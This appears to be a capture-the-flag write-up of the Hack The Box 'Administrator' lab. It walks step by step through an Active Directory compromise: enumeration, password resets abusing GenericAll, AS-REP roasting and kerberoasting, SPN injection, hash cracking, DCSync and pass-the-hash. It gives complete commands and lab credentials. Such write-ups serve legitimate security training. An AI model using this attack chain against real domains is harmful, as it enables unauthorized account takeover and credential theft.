---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Administrator?tab=play_machine
Difficulty: Medium
Featured: yes
aliases:
  - Windows
---

---
# Information / Description

![](../../0.%20Assets/Administrator-1791364366212.webp)
![149](../../0.%20Assets/Administrator-1791364382139.webp)

A really fun machine, and one I'd recommend.

---

# Walkthrough



Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,55549,55599,55604,55611,55616,55630
```

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-07 16:17:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55549/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55599/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
55604/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55611/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55616/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55630/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Add the domain to `/etc/hosts`.

![](../../0.%20Assets/Administrator-1791366485420.webp)

The server allows anonymous connections.

```
nxc smb $T -u '' -p ''
```

![[Administrator-1791365773171.webp]]

But we can't see any shares or enumerate users, and the `Guest` user is disabled.

`rpc` was reachable with anonymous credentials, but we aren't allowed to run most queries.

![](../../0.%20Assets/Administrator-1791365750764.webp)

I also tried anonymous access on `ftp`, without success.

So anonymous access is broadly allowed, but for the most part there isn't much we can do with it.

Let's try other protocols.

`ldap`
```
ldapsearch -H ldap://$T -x -b "CN=Users,DC=administrator,DC=htb" "(objectClass=person)" sAMAccountName
```

![](../../0.%20Assets/Administrator-1791366067479.webp)

And I couldn't get anywhere with the other protocols either.

After about 30 minutes of searching, I finally read this, which I should have caught much sooner:

![](../../0.%20Assets/Administrator-1791366559599.webp)

So we have credentials. Let's see what we can do with them.

![](../../0.%20Assets/Administrator-1791366610042.webp)

![](../../0.%20Assets/Administrator-1791366659415.webp)

Before we jump into `winrm` and access the machine, let's check whether Olivia has any shares or anything important.

I'll start with `ftp` so I don't forget about it.

```
netexec ftp $T -u 'Olivia' -p 'ichliebedich'
```

![](../../0.%20Assets/Administrator-1791366801571.webp)

`SMB`

```
 netexec smb $T -u 'Olivia' -p 'ichliebedich' --shares
```

![](../../0.%20Assets/Administrator-1791366900232.webp)

```
netexec smb $T -u 'Olivia' -p 'ichliebedich'  -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

![](../../0.%20Assets/Administrator-1791366974136.webp)

![](../../0.%20Assets/Administrator-1791366981885.webp)

The file `registry.pol` was a binary and looked interesting, so I ran `strings` on it.

![](../../0.%20Assets/Administrator-1791367113201.webp)


![](../../0.%20Assets/Administrator-1791367079840.webp)

We'll keep it in mind just in case.

Let's connect through evil-winrm.

```
 evil-winrm -i $T -u Olivia -p 'ichliebedich'
```

![](../../0.%20Assets/Administrator-1791367200444.webp)

It looks like `olivia` is some kind of administrator. Let's bring out the heavier tooling: dump the domain with `RustHound` and import it into `bloodhound`.

```
 ./rusthound-ce \
  -d administrator.htb \
  -u 'Olivia@administrator.htb' -p 'ichliebedich' \
  -f $T \
  -z
```

![](../../0.%20Assets/Administrator-1791367486612.webp)

Import the `.zip` and mark `olivia` as owned.

![](../../0.%20Assets/Administrator-1791367551857.webp)

Looking at the outbound object controls:

![](../../0.%20Assets/Administrator-1791367615046.webp)

We can see we have the `genericall` right over `Michael`.

Under the Linux Abuse tab, Bloodhound conveniently spells out how to abuse this right.

![](../../0.%20Assets/Administrator-1791368023903.webp)

`Targeted kerberoast` is a neat technique, but I don't want a hash, I want direct access to the user, so let's try the `Force change password` route instead.

I ran into some issues, so I looked it up online.

![](../../0.%20Assets/Administrator-1791369219931.webp)

![](../../0.%20Assets/Administrator-1791369225882.webp)

```
net user  "michael" "Newpass12345"
```

Let's test it.

```
netexec smb $T -u 'michael' -p 'Newpass12345'
```

![](../../0.%20Assets/Administrator-1791369260273.webp)


Let's see what he's allowed to do.

![](../../0.%20Assets/Administrator-1791369402880.webp)

Now let's see what this user can do on the machine directly.

```
./nxcspray all $T -u 'michael' -p 'Newpass12345'
```

![](../../0.%20Assets/Administrator-1791369380226.webp)

Again, let's check the shares before we change benjamin's password.

```
netexec smb $T -u 'michael' -p 'Newpass12345' --shares
SMB         10.129.160.52   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.160.52   445    DC               [+] administrator.htb\michael:Newpass12345
SMB         10.129.160.52   445    DC               [*] Enumerated shares
SMB         10.129.160.52   445    DC               Share           Permissions     Remark
SMB         10.129.160.52   445    DC               -----           -----------     ------
SMB         10.129.160.52   445    DC               ADMIN$                          Remote Admin
SMB         10.129.160.52   445    DC               C$                              Default share
SMB         10.129.160.52   445    DC               IPC$            READ            Remote IPC
SMB         10.129.160.52   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.160.52   445    DC               SYSVOL          READ            Logon server share
```

Same as before, so let's do the password change.

I tried a few methods, and this one using `RPC` worked.

```
rpcclient -U administrator.htb/michael $T
Password for [ADMINISTRATOR.HTB\michael]:
rpcclient $> setuserinfo2 benjamin 23 12345aA
```

![](../../0.%20Assets/Administrator-1791370771702.webp)

Mark `benjamin` as owned in bloodhound.

![](../../0.%20Assets/Administrator-1791370838914.webp)


Running the shortest-path-to-domain-admins query, none of our users are useful right now, so let's do some user enumeration followed by as-rep roasting or kerberoasting.

![](../../0.%20Assets/Administrator-1791370930565.webp)

```
nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000
```

![](../../0.%20Assets/Administrator-1791371123609.webp)

Let's generate a list from this.

```
nxc smb $T -u 'benjamin' -p '12345aA' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![](../../0.%20Assets/Administrator-1791371172248.webp)

And let's start on the AD attacks.

`as-rep` roasting.

```
impacket-GetNPUsers 'administrator.htb/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```


![](../../0.%20Assets/Administrator-1791371226087.webp)


No problem, let's try `kerberoasting`.

![](../../0.%20Assets/Administrator-1791371414621.webp)

No luck there either. It looks like we really need to get access to the user `Emily`.



![](../../0.%20Assets/Administrator-1791374321018.webp)

After a good while of enumeration, I remembered there was an `ftp` server.

![](../../0.%20Assets/Administrator-1791375421134.webp)

(I put my head in my hands for a solid 30 seconds after this one.)

![](../../0.%20Assets/Administrator-1791375455519.webp)

Let's see what this is.

![](../../0.%20Assets/Administrator-1791375469416.webp)

It looks like some kind of password manager file.

I looked up the right `hashcat` mode and ran a brute force attack.

```
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt --force
```

![](../../0.%20Assets/Administrator-1791375654533.webp)

![](../../0.%20Assets/Administrator-1791375686719.webp)

It looks like we can open it in `Password Safe`.

```
sudo apt install passwordsafe
```

Import the file and use the password we just cracked.
![](../../0.%20Assets/Administrator-1791375871923.webp)


![](../../0.%20Assets/Administrator-1791375917428.webp)


I tested all of the credentials.

![](../../0.%20Assets/Administrator-1791376024518.webp)

Only `Emily`'s turned out to be valid, which is exactly what we needed.

Let's spray the protocols to see what this user can do.

```
./nxcspray all $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![](../../0.%20Assets/Administrator-1791376085143.webp)

We have `win-rm` access, so let's connect.

```
evil-winrm -i $T -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![](../../0.%20Assets/Administrator-1791376161730.webp)

Inside Emily's Desktop we find the first flag.

Now we just follow the path bloodhound laid out.

![](../../0.%20Assets/Administrator-1791376244697.webp)

I hit a few snags but worked it out. We want a targeted `kerberoast` attack, and since `kerberoasting` relies on an SPN attached to a user and `Ethan` doesn't have one, we need to inject one.

First, sync our clock to the DC's time.

```
sudo timedatectl set-ntp off
sudo rdate -n $T
```

Inject the fake `SPN`.

```
bloodyAD -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.160.52 set object Ethan servicePrincipalName -v 'falso/servicio'
```

Perform the `kerberoasting` attack.

```
nxc ldap $T -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoasting hashes.txt
```

![](../../0.%20Assets/Administrator-1791378282491.webp)

Crack the hash.

```
sudo hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  --force
```


![](../../0.%20Assets/Administrator-1791378326550.webp)



![](../../0.%20Assets/Administrator-1791378371061.webp)


Now all that's left is the `DCSync`, or a dump of the credentials.

![](../../0.%20Assets/Administrator-1791378745023.webp)

We can't get in through `win-rm`, so we'll abuse this from Linux.

![](../../0.%20Assets/Administrator-1791378534011.webp)

Because `ethan` holds the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights, we can run this attack. So let's ask the `DC` for the `ntds` data and retrieve the hashes.

```
nxc smb $T -u ethan -p 'limpbizkit' --ntds
```


![](../../0.%20Assets/Administrator-1791378952156.webp)

Now, with the administrator's hash, we can run a `PtH (pass the hash)` attack through `psexec`.

```
psexec.py administrator.htb/administrator@$T -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
```

![](../../0.%20Assets/Administrator-1791379192165.webp)

![](../../0.%20Assets/Administrator-1791379214360.webp)